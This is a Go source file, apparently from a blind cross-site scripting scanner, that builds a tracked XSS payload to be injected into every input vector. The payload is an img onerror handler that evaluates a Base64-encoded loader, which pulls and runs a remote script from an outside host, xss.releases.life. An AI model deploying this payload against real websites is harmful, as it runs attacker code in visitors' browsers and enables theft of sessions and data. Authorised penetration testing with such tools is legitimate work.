package xss

import (
	"crypto/rand"
	"encoding/hex"
)

// XSSPayload representa un payload XSS con su metadata
type XSSPayload struct {
	ID          string `json:"id"`
	Type        string `json:"type"`
	Content     string `json:"content"`
	Vector      string `json:"vector"`
	CallbackURL string `json:"callback_url"`
}

// XSSPayloadMetadata es la metadata que se envía al servidor
type XSSPayloadMetadata struct {
	ID     string `json:"id"`
	Type   string `json:"type"`
	Vector string `json:"vector"`
}

// GeneratePayloadID genera un ID único para tracking
func GeneratePayloadID() string {
	bytes := make([]byte, 8)
	rand.Read(bytes)
	return hex.EncodeToString(bytes)
}

// GetAllPayloads retorna todos los payloads XSS embebidos
func GetAllPayloads(callbackServer string) []XSSPayload {
	payloads := []XSSPayload{}

	// === PAYLOAD ESPECÍFICO XSS HUNTER ===
	// Usamos el payload exacto proporcionado, con el loader en Base64 ya definido
	specificPayload := `"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlbGVhc2VzLmxpZmUiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>`

	id1 := GeneratePayloadID()
	payloads = append(payloads, XSSPayload{
		ID:          id1,
		Type:        "img-onerror-specific",
		Vector:      "all", // Se inyectará en TODOS los vectores
		CallbackURL: callbackServer,
		Content:     specificPayload,
	})

	return payloads
}

// GetPayloadMetadata extrae solo la metadata de los payloads (para enviar al servidor)
func GetPayloadMetadata(payloads []XSSPayload) []XSSPayloadMetadata {
	metadata := make([]XSSPayloadMetadata, len(payloads))
	for i, p := range payloads {
		metadata[i] = XSSPayloadMetadata{
			ID:     p.ID,
			Type:   p.Type,
			Vector: p.Vector,
		}
	}
	return metadata
}
